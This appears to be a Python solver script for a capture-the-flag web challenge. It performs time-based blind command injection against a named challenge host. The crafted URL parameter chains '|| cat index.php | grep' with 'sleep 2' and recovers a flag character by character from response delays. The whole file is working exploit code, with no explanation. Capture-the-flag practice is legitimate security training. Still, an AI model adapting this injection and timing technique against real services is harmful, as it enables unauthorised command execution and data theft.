import requests

def my_request(url):
	response = requests.get(url)
	return response


def solve():
	res = "FLAG{1q2w3e4r!@"
	while True:
		for c in range(20,127):
			if c == 42 or c == 46:
				continue
			url = f"http://p.rubiya.kr:10015/?url=XX+%7C%7C+cat+index.php+%7C+grep+"
			url += f"\"{res}"+chr(c)+"\"+%26%26+sleep+2"	
			response = my_request(url)
			if response.elapsed.total_seconds() > 1:
				res += chr(c)
				print(res)
				break
	print("Finally, I get flag:",res)

if __name__ == "__main__":
	solve()

